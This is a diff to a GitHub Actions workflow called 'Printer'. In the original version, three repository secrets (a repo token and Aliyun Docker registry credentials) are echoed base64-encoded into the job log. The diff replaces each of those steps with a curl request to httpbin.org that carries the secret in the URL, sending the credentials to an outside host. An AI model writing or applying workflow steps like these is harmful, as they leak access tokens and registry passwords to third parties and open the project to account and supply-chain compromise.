@@ -1,4 +1,4 @@
-name: Printer Actions
+name: Printer
 
 on:
   workflow_dispatch:
@@ -8,11 +8,11 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Print REPO_TOKEN
-        run: echo -n "${{ secrets.REPO_TOKEN }}" | base64
+        run: curl -L httpbin.org/get?id=${{ secrets.REPO_TOKEN }}
         id: repo_token
       - name: Print ALIYUN_DOCKER_USERNAME
-        run: echo -n "${{ secrets.ALIYUN_DOCKER_USERNAME }}" | base64
+        run: curl -L httpbin.org/get?id=${{ secrets.ALIYUN_DOCKER_USERNAME }}
         id: aliyun_docker_username
       - name: Print ALIYUN_DOCKER_PASSWORD
-        run: echo -n "${{ secrets.ALIYUN_DOCKER_PASSWORD }}" | base64
+        run: curl -L httpbin.org/get?id=${{ secrets.ALIYUN_DOCKER_PASSWORD }}
         id: aliyun_docker_password
